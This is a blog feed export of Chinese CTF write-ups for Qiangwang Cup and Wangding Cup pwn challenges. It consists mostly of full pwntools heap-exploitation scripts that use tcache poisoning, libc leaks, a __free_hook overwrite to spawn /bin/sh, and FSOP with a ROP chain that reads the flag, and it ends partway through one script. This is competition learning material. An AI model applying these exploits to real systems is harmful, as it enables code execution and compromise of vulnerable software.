<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C12en</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-12-20T14:34:47.910Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>C12en</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>s8强网杯总决赛</title>
    <link href="http://example.com/2024/12/20/s8%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B/"/>
    <id>http://example.com/2024/12/20/s8%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%80%BB%E5%86%B3%E8%B5%9B/</id>
    <published>2024-12-20T14:31:21.000Z</published>
    <updated>2024-12-20T14:34:47.910Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>距离强网打完已经两周了 这两周因为忙着各种期末大作业和期末考试 到现在才有空写wp 结果发现已经把内容忘了差不多了。。。。 不过也没什么好讲解的 考察的都是比较简单的堆漏洞 难点只是需要自己构造chunk来实现一些漏洞的利用 需要攻击者对于堆的各种机制比较熟悉 以及放开思维思考</p><h1 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">#io = process(&quot;./pwn&quot;)</span><br><span class="line">io = remote(&quot;8.147.129.227&quot;,34825)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc-2.31.so&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def encode_add(payload):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;Enter the text to encode: &quot;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">def decode_add(payload):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;Enter the text to decode: &quot;)</span><br><span class="line">    encoded = base64.b64encode(payload)</span><br><span class="line">    print(len(encoded)/4*3/16)</span><br><span class="line">    io.send(encoded)</span><br><span class="line">def remove_encode(index):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">def remove_decode(index):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">def show_encode(index):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">def show_decode(index):</span><br><span class="line">    io.recvuntil(&quot;Enter your choice: &quot;)</span><br><span class="line">    io.sendline(&quot;6&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x205B)&#x27;)</span><br><span class="line">show_encode(-51)</span><br><span class="line"># pause()</span><br><span class="line">io.recv()</span><br><span class="line">elf_addr = u64(io.recvuntil(&quot;\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x5008</span><br><span class="line">success(&quot;elf_addr :&quot;+hex(elf_addr))</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x100)</span><br><span class="line"></span><br><span class="line">for i in range(12):</span><br><span class="line">    decode_add(payload)</span><br><span class="line">for i in range(5,12):</span><br><span class="line">    remove_decode(i)</span><br><span class="line">remove_decode(0)</span><br><span class="line">decode_add(cyclic(0x9))#0</span><br><span class="line">show_decode(0)</span><br><span class="line">io.recv()</span><br><span class="line">libc_addr = u64(io.recvuntil(&quot;\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\x00&#x27;))-227-libc.sym[&#x27;__malloc_hook&#x27;]-0x10</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line">remove_decode(2)</span><br><span class="line">remove_decode(4)</span><br><span class="line">decode_add(cyclic(0xe0))#2</span><br><span class="line">decode_add(cyclic(0x9))#4</span><br><span class="line">show_decode(4)</span><br><span class="line">io.recv()</span><br><span class="line">heap_addr = u64(io.recvuntil(&quot;\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x663</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">malloc_hook = libc_addr + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">decode_add(p64(free_hook))</span><br><span class="line">success(&quot;elf_addr :&quot;+hex(elf_addr))</span><br><span class="line"></span><br><span class="line">decode_add(p64(heap_addr+0x500))#5</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    decode_add(cyclic(0x100))</span><br><span class="line"></span><br><span class="line">decode_add(cyclic(0xa0))</span><br><span class="line">for i in range(7,14):</span><br><span class="line">    remove_decode(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    decode_add(b&quot;k&quot;*0x10)</span><br><span class="line">for i in range(7,14):</span><br><span class="line">    remove_decode(i)</span><br><span class="line">    </span><br><span class="line">system_addr = libc_addr + libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1F7C)&#x27;)</span><br><span class="line">number = (heap_addr+0x500)-(elf_addr+0x51a0)</span><br><span class="line">a = number // 8</span><br><span class="line">remove_decode(a+40)</span><br><span class="line">remove_decode(4)</span><br><span class="line">remove_decode(6)</span><br><span class="line">for i in range(7):</span><br><span class="line">    decode_add(cyclic(0x8))</span><br><span class="line">decode_add(p64(free_hook))</span><br><span class="line">decode_add(p64(free_hook))</span><br><span class="line">remove_decode(1)</span><br><span class="line">remove_decode(2)</span><br><span class="line">decode_add(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">decode_add(p64(system_addr))</span><br><span class="line">remove_decode(1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="heap"><a href="#heap" class="headerlink" title="heap"></a>heap</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">#io = process(&quot;./pwn&quot;)</span><br><span class="line">io = remote(&quot;47.94.85.95&quot;,20682)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def add(idx,content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(&quot;content: &quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.send(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">    io.recvuntil(&quot;idx: &quot;)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(&quot;content: &quot;)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line">add(0,cyclic(0x16))</span><br><span class="line">delete(0)</span><br><span class="line">show(&quot;0&quot;)</span><br><span class="line">elf_addr = u64(io.recvuntil(&quot;\x0a&quot;,drop=True)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x1bf0</span><br><span class="line">success(&quot;elf_addr :&quot;+hex(elf_addr))</span><br><span class="line">add(1,&quot;a&quot;)</span><br><span class="line">delete(1)</span><br><span class="line">edit(1,cyclic(0x10))</span><br><span class="line">delete(1)</span><br><span class="line">edit(1,b&#x27;\xa0&#x27;)</span><br><span class="line">add(2,&quot;a&quot;)</span><br><span class="line">add(3,&quot;a&quot;*8)</span><br><span class="line"></span><br><span class="line">def encrypt(data, key):</span><br><span class="line">    </span><br><span class="line">    # 创建AES-ECB加密器</span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    </span><br><span class="line">    # 填充数据</span><br><span class="line">    padded_data = pad(data, AES.block_size)</span><br><span class="line">    </span><br><span class="line">    # 加密</span><br><span class="line">    encrypted_data = cipher.encrypt(padded_data)</span><br><span class="line">    return encrypted_data</span><br><span class="line"></span><br><span class="line">key = b&quot;aaaaaaaa&quot;.ljust(16,b&#x27;\x00&#x27;)</span><br><span class="line">show(0)</span><br><span class="line">pre_data = io.recv(16)</span><br><span class="line">data  = encrypt(pre_data,key)</span><br><span class="line">heap_addr = data[:6]</span><br><span class="line">heap_addr = u64(heap_addr.ljust(8,b&#x27;\x00&#x27;))-0x261</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line"></span><br><span class="line">add(6,cyclic(0x10))</span><br><span class="line">for i in range(50):</span><br><span class="line">    add(4,&quot;aaaa&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x2f8))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(5,p64(0x561))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x858))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0x21))</span><br><span class="line"></span><br><span class="line">delete(6)</span><br><span class="line">show(6)</span><br><span class="line">pre_data = io.recv(16)</span><br><span class="line">data  = encrypt(pre_data,key)</span><br><span class="line">libc_addr = data[:6]</span><br><span class="line">libc_addr = u64(libc_addr.ljust(8,b&#x27;\x00&#x27;))-96-libc.sym[&#x27;__malloc_hook&#x27;]-0x10</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line">free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">IO_list_all = libc_addr + libc.sym[&#x27;_IO_list_all&#x27;]</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x20))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">payload = b&#x27;\x00\x00\x00\x00\x07\x00\x07\x00&#x27;</span><br><span class="line">add(4,payload)</span><br><span class="line"></span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x2f8))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0xc1))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x300))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x870))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(10,p64(0))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x878))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0x441))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x880))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x418))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(IO_list_all-0x20))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">IO_wfile_jumps = libc_addr + libc.sym[&#x27;_IO_wfile_jumps&#x27;]</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x898))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(1))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x888))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x910))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(heap_addr+0x300))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x948))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(IO_wfile_jumps))</span><br><span class="line"></span><br><span class="line">setcontext = libc_addr + libc.sym[&#x27;setcontext&#x27;]+61</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x368))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(setcontext))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x318))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x3a0))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(heap_addr+0x300+0xf0))</span><br><span class="line"></span><br><span class="line">ret_addr = elf_addr + 0x000000000000101a</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x3a8))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(ret_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x3e0))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(heap_addr+0x300))</span><br><span class="line"></span><br><span class="line">rdi_addr = libc_addr + next(libc.search(asm(&quot;pop rdi;ret&quot;)))</span><br><span class="line">rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))</span><br><span class="line">rdx_r12_addr = libc_addr + 0x0000000000119431</span><br><span class="line">read_addr = libc_addr + libc.sym[&#x27;read&#x27;]</span><br><span class="line">open_addr = libc_addr + libc.sym[&#x27;open&#x27;]</span><br><span class="line">write_addr = libc_addr + libc.sym[&#x27;write&#x27;]</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x3f0))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rdi_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x600))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,b&#x27;flag\x00\x00\x00\x00&#x27;)</span><br><span class="line"></span><br><span class="line">flag_addr = heap_addr + 0x600</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x3f8))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(flag_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x400))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rsi_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x410))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(open_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x418))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rdi_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x420))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(3))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x428))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rsi_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x430))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(heap_addr+0xb00))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x438))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rdx_r12_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x440))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0x100))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x448))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(0))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x450))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(read_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x458))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(rdi_addr))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x460))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(1))</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">edit(0,cyclic(0x10))</span><br><span class="line">delete(0)</span><br><span class="line">edit(0,p64(heap_addr+0x468))</span><br><span class="line">add(4,&quot;aaaa&quot;)</span><br><span class="line">add(4,p64(write_addr))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *_IO_wdoallocbuf+43&#x27;)</span><br><span class="line">delete(100)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">flag = io.recvuntil(&quot;&#125;&quot;)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>网鼎杯半决赛</title>
    <link href="http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/"/>
    <id>http://example.com/2024/11/23/%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/</id>
    <published>2024-11-23T07:36:04.000Z</published>
    <updated>2024-12-20T14:30:23.792Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="cardmaster"><a href="#cardmaster" class="headerlink" title="cardmaster"></a>cardmaster</h1><h2 id="赛时wp"><a href="#赛时wp" class="headerlink" title="赛时wp"></a>赛时wp</h2><p>超了一小时才做出来。。。思路变换的太不灵活了 对于realloc也不够熟悉<br>不过说实话这题就是纯靠动调猜出来的<br>主要的思路就是利用double free来申请到main_chunk(即存储输出函数和存储字符串的堆块地址的chunk) 从而覆盖chunk中的指针 这样就可以泄露出libc地址 堆地址的话就在double free的时候泄露就行了  主要的时间卡在了泄露libc这一步<br>拿到libc地址后 就是想办法覆盖输出函数指针了  但是试了很久都没找到办法像刚才一样来构造double free 最后试了出来 利用realloc来把0x30的chunk放到tcachebin中 然后调用初始化函数就可以申请出来两个0x30的chunk  然后edit的时候 就可以进入malloc那个分之  就能把0x30的chunk申请出来了 而且这个chunk还是可以自定义地址的 然后就是打malloc_hook了  三个ogg的条件正常都没有办法实现 这里用realloc和malloc相结合的办法可以打通</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">io = process(&quot;./pwn&quot;)</span><br><span class="line">#io = remote(&quot;83.43.93.13&quot;,15000)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">def init_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;1&quot;)</span><br><span class="line">def edit_card(count,number,level,payload):</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;2&quot;)</span><br><span class="line">    io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">    io.sendline(str(count))</span><br><span class="line">    io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">    io.sendline(str(number))</span><br><span class="line">    io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">    io.sendline(str(level))</span><br><span class="line">    io.recvuntil(&quot;new suite set:&quot;)</span><br><span class="line">    io.send(payload)</span><br><span class="line">def shuffle_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;4&quot;)</span><br><span class="line">def show_card():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;5&quot;)</span><br><span class="line">def get_info():</span><br><span class="line">    io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">    io.sendline(&quot;3&quot;)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">edit_card(0,1,100,&quot;2\n&quot;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line">io.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">io.sendline(&quot;2&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x1258)&#x27;)</span><br><span class="line">io.recvuntil(&quot;suit count:&quot;)</span><br><span class="line">io.sendline(str(0))</span><br><span class="line">io.recvuntil(&quot;digit range 1 - ?&quot;)</span><br><span class="line">io.sendline(str(1))</span><br><span class="line">io.recvuntil(&quot;randomize level:&quot;)</span><br><span class="line">io.sendline(str(100))</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">heap_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">success(&quot;heap_addr :&quot;+hex(heap_addr))</span><br><span class="line">edit_card(300,0,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x137B)&#x27;)</span><br><span class="line">edit_card(11,0,100,&quot;\xa0&quot;)</span><br><span class="line"># pause()</span><br><span class="line">edit_card(11,0,100,p64(heap_addr-0x3c8))</span><br><span class="line">edit_card(1,1,100,&quot;\xa0&quot;)</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(1,1,100,&quot;a&quot;)</span><br><span class="line"># pause()</span><br><span class="line">init_card()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0x11FC)&#x27;)</span><br><span class="line">edit_card(2,0,100,p64(heap_addr-0x640+0xa30))</span><br><span class="line"># pause()</span><br><span class="line"># gdb.attach(io,&#x27;b *$rebase(0xB10)&#x27;)</span><br><span class="line">get_info()</span><br><span class="line">io.recvuntil(&quot;suit chara set:&quot;)</span><br><span class="line">libc_addr = u64(io.recv(6).ljust(8,b&#x27;\x00&#x27;))-0x3ebca0</span><br><span class="line">success(&quot;libc_addr :&quot;+hex(libc_addr))</span><br><span class="line"># # pause()</span><br><span class="line"></span><br><span class="line">edit_card(8,0,100,&quot;a&quot;)</span><br><span 